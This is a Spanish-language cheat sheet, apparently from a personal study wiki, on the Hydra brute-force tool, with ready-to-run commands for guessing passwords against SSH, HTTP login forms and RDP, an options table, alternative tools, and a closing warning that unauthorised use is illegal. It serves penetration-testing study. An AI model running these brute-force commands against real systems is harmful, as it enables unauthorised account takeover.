## 📌 **Uso Básico**

La sintaxis básica de [[Hydra🐉]] es:

`hydra -l <usuario> -P <archivo_de_contraseñas> <objetivo> <servicio>`

Ejemplo atacando SSH en una máquina:

`hydra -l admin -P rockyou.txt 192.168.1.10 ssh`

- `-l admin` → Usuario objetivo.
- `-P rockyou.txt` → Lista de contraseñas.
- `192.168.1.10` → Dirección IP del objetivo.
- `ssh` → Servicio a atacar.

## 📌 **Opciones Útiles**

|Opción|Descripción|
|---|---|
|`-L users.txt`|Usar un archivo con múltiples nombres de usuario.|
|`-P passwords.txt`|Usar una lista de contraseñas en vez de solo una.|
|`-t 4`|Número de intentos en paralelo (por defecto es 16).|
|`-V`|Muestra cada intento realizado.|
|`-f`|Detiene el ataque al encontrar una credencial válida.|

Ejemplo para probar múltiples usuarios:

`hydra -L users.txt -P passwords.txt 192.168.1.10 ssh`

## 📌 **Ataques a Formularios Web**

Si un sitio web tiene autenticación por formulario (ejemplo, login en HTTP POST), puedes hacer:

`hydra -L users.txt -P passwords.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`

Donde:

- `/login.php` → Página del formulario.
- `user=^USER^&pass=^PASS^` → Parámetros de usuario y contraseña.
- `F=incorrect` → Texto que indica fallo de autenticación.

Si un sitio se hace mediante petición GET, puedes hacerlo de la siguiente manera:

`hydra -L users.txt -P passwords.txt 192.168.1.10 http-get /`

Donde:

- `/` → Pagina donde aparece el inicio de sesión.

## 📌 **Ataque contra RDP (Escritorio Remoto)**

Si el objetivo usa Windows con RDP habilitado:

`hydra -L users.txt -P passwords.txt 192.168.1.10 rdp`

Si el objetivo usa Windows con RDP habilitado en otro puerto:

`hydra -L users.txt -P passwords.txt 192.168.1.10 rdp -s 1234`

## 📌 **Alternativas a Hydra**

- **Medusa**: Similar a Hydra, pero con más control sobre los ataques.
- **Ncrack**: Especializado en ataques a redes.
- **John the Ripper**: Para descifrar hashes de contraseñas.

## 📌 **Consideraciones Legales**

⚠️ **El uso de Hydra sin autorización es ilegal y puede llevarte a problemas legales**. Úsalo solo en entornos controlados, como laboratorios de pruebas o con permiso explícito.